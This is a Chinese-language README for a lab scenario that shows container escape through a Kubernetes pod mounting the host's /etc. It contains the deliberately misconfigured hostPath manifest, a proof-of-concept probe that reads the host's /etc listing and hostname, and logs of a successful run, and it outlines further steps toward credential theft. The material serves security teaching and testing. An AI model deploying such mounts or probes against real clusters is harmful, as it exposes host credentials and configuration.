# 挂载宿主机 /etc 导致容器逃逸

## 1. 简介

这不是内核漏洞，而是一类非常典型的高危配置错误：把宿主机的 `/etc` 目录直接挂进容器。

`/etc` 可以理解成 Linux 主机的“系统配置柜”。里面放着主机名、网络配置、认证配置、服务配置，很多时候还会放和凭据、信任关系有关的关键文件。只要容器能直接看到宿主机 `/etc`，风险就已经不只是“多看几份配置”这么简单了，而是可能进一步变成信息泄露、持久化，甚至为后续主机接管提供入口。

当前目录里的脚本主要负责两件事：

- 把这个错误配置场景部署出来。
- 证明容器里真的看到了宿主机 `/etc` 的内容。

## 2. 价值

- 验证 `hostPath` 是否把宿主机敏感配置目录直接暴露给了容器。
- 帮助初学者理解“挂一个目录”为什么也可能是高危逃逸前提。
- 为后续凭据窃取、配置篡改、宿主持久化等更深一步动作提供前置证据。

## 3. 作用机理

理解这个场景，最重要的是不要把 `/etc` 当成普通目录。

对于宿主机来说，`/etc` 不是业务数据目录，而是系统身份和行为规则的集中位置。容器一旦能直接读它，就相当于拿到了很多“只该由宿主机管理员掌握的信息”。如果挂载还是可写的，那风险还会继续升级成“容器改宿主机配置”。

### 第一步：真正的风险源头在 `scene.yaml`

把风险带进来的，是下面这段配置：

```yaml
# scene.yaml
spec:
  containers:
  - name: ubuntu
    volumeMounts:
    - name: host-etc
      mountPath: /host-etc
  volumes:
  - name: host-etc
    hostPath:
      path: /etc

# 注释：这里把宿主机 /etc 原样挂进了容器的 /host-etc
# 容器后面看到的不是“容器自己的配置文件”，而是宿主机真实的 /etc
```

这一步本身就已经说明边界在变薄。因为容器开始直接接触宿主机的系统配置面，而不是只待在自己镜像的文件系统里。

### 第二步：`run_poc.sh` 先确认场景已经真实落地

脚本先部署 Pod，再等待它 Ready：

```bash
# run_poc.sh
kubectl apply -f "$MANIFEST"

if ! kubectl wait --for=condition=Ready "pod/$POD_NAME" -n "$NAMESPACE" --timeout=120s; then
  echo "[*] Verdict: BLOCKED_STAGE=k8s_pod_not_ready"
  exit 1
fi
```

这一步是在确认：

- 带 `hostPath: /etc` 的 Pod 不只是写在 YAML 里，而是已经真的运行起来了。

### 第三步：真正的验证动作，是去容器里读 `/host-etc`

Pod Ready 后，脚本会执行这组探针：

```bash
# run_poc.sh
"$HELPER" "$NAMESPACE" "$POD_NAME" 'id; ls /host-etc | head; cat /host-etc/hostname || true'

# 注释 1：ls /host-etc | head 用来确认容器确实看到了宿主机 /etc 目录内容
# 注释 2：cat /host-etc/hostname 用来读一个非常直观的宿主机配置项
# 注释 3：如果这里能读到宿主机主机名，说明挂载已经不是“空目录”或“伪装目录”
```

这里选 `hostname` 很合理，因为它特别容易理解：

- 如果容器读到的是自己镜像里的东西，那不会出现宿主机的主机名。
- 如果容器读到的真是宿主机 `/etc/hostname`，就说明这条边界已经被打穿到“宿主机配置可见”的程度。

### 第四步：为什么“只读到 /etc”也已经很危险

因为 `/etc` 里经常包含很多能帮助攻击者继续往前走的信息，例如：

1. 主机名和网络配置。
2. 认证和信任配置。
3. 服务启动配置。
4. 账户、sudo、解析器、软件源等系统行为信息。

所以即使当前脚本只是做“读取验证”，它也已经证明容器拿到了后续攻击非常有价值的情报面。

### artifacts 运行证据

当前日志很适合说明“宿主机 `/etc` 已经暴露给容器，但脚本并没有自动做更深层利用”。

```text
# artifacts/repro/docker/mount-host-etc/run.log
pod/mount-host-etc created
pod/mount-host-etc condition met
[*] Exec probe failed, attempting startup-log fallback...
K8S_LOG_PROBE_BEGIN
uid=0(root) gid=0(root) groups=0(root)
10-network-magic.conf
10-network-security.conf
adduser.conf
alternatives
apt
bash.bashrc
bindresvport.blacklist
binfmt.d
ca-certificates
ca-certificates.conf
escape-lab-control-plane
K8S_LOG_PROBE_OK
[*] Verdict: PROBE_LOG_FALLBACK_OK
[*] 可直接读取宿主机配置、凭据类文件（按权限限制）。

# 注释 1：前面一串文件名来自 ls /host-etc | head，说明容器确实看到了宿主机 /etc 内容
# 注释 2：最后的 escape-lab-control-plane 是 /host-etc/hostname 的读取结果
# 注释 3：这已经足以证明“宿主机配置目录暴露”这个危险前提成立
```

这次运行里在线 `exec` 同样失败了，但脚本自动回退到了容器启动日志取证：

```text
error: Internal error occurred: error executing command in container: ... no such file or directory: unknown
[*] Exec probe failed, attempting startup-log fallback...
```

所以当前 artifacts 的结论仍然有效，只是证据来源不是在线 exec，而是启动日志回退。

## 4. 关键节点分析

1. 风险根源是 `hostPath: /etc`，不是脚本本身。
2. 当前脚本验证的是“宿主机配置目录是否已经暴露”，不是“宿主机已被自动接管”。
3. `ls /host-etc` 和 `cat /host-etc/hostname` 是最关键的两组机理证据。
4. 一旦这个挂载还是可写，风险会从信息泄露进一步升级为宿主机配置篡改。

## 5. 目录结构

```text
mount-host-etc/
|- scene.yaml
|- run_poc.sh
|- requirements.txt
`- README.md
```

## 6. 可直接复现步骤与故障排查

先准备可访问的 Kubernetes 集群：

```bash
scripts/env_labctl.sh profile k8s-kind
bash cves/mount-host-etc/run_poc.sh
```

清理：

```bash
bash cves/mount-host-etc/run_poc.sh --cleanup
```

常见故障：

```text
情况 1：出现 BLOCKED_STAGE=k8s_api_unreachable
# 集群 API 不可达，场景还没部署成功

情况 2：出现 BLOCKED_STAGE=k8s_pod_not_ready
# Pod 没 ready，危险挂载还没有真正进入运行状态

情况 3：exec probe failed, attempting startup-log fallback
# 在线 exec 失败不等于取证失败
# 如果后面仍然出现 K8S_LOG_PROBE_BEGIN / K8S_LOG_PROBE_OK，并且能看到 /host-etc 内容，就说明证据有效
```

## 7. 成功判定（结合 run_poc.sh 与 artifacts）

### 真正命中当前脚本要验证的目标

下面这些条件同时出现，就说明当前脚本的验证目标已经命中：

1. Pod 创建并 Ready。
2. 日志里出现 `ls /host-etc` 的目录项输出。
3. 日志里读出了宿主机 `hostname`。
4. 最终 verdict 为：

```text
[*] Verdict: PROBE_LOG_FALLBACK_OK
```

这代表：

- 容器已经看到宿主机 `/etc`。
- 宿主机配置目录暴露这个危险前提已经被证实。

### 只到中间阶段 / 部分命中

如果场景部署成功，但只拿到部分目录输出，或者 `hostname` 没读出来，那就只能算“已进入危险场景，但关键证据不完整”。

当前仓库里的现成日志比这更强，因为它已经同时给出目录内容和主机名读取结果。

### 前置失败 / 明确阻断

以下情况属于前置失败：

- `BLOCKED_STAGE=k8s_api_unreachable`
- `BLOCKED_STAGE=k8s_pod_not_ready`
- 缺少 `kubectl`

它们只能说明环境没准备好，不能说明 `hostPath: /etc` 是安全的。

### 如果要算“最终逃逸成功”，还差什么

至少还要补：

1. 进一步读取高价值宿主机配置或凭据文件。
2. 或者证明容器能改写宿主机 `/etc` 中的关键配置。
3. 观察到宿主机侧的实际配置变化或后续命令执行效果。

当前仓库里的现有日志还没有走到这一步，所以不能写成“已自动完成宿主机接管”。

## 8. 参考

- https://kubernetes.io/docs/concepts/storage/volumes/#hostpath
- `cves/metarget/writeups_cnv/mount-host-etc/`

## 9. 统一复现记录

### 9.1 复现范围

- Kubernetes 场景：部署把宿主机 `/etc` 挂入容器的 Pod。
- 当前仓库已有证据来自 Docker/Kubernetes 组合环境。
- 统一判定口径：Pod Ready + `/host-etc` 目录项可见 + `hostname` 可读 + `PROBE_LOG_FALLBACK_OK`。

### 9.2 当前结果摘要

| 观察项 | 结果 |
| --- | --- |
| Pod 创建 | 成功 |
| Pod Ready | 成功 |
| 在线 exec 探针 | 失败，随后切换日志回退 |
| 回退日志取证 | 成功 |
| `/host-etc` 目录内容 | 可见 |
| `/host-etc/hostname` | 可读 |
| 最终 verdict | `PROBE_LOG_FALLBACK_OK` |

### 9.3 结论

当前样本已经证明：

- 容器确实看到了宿主机 `/etc`。
- 宿主机主机名等配置内容已经暴露给容器。
- 这足以说明该错误配置具备继续向信息泄露和配置篡改扩展的高风险。
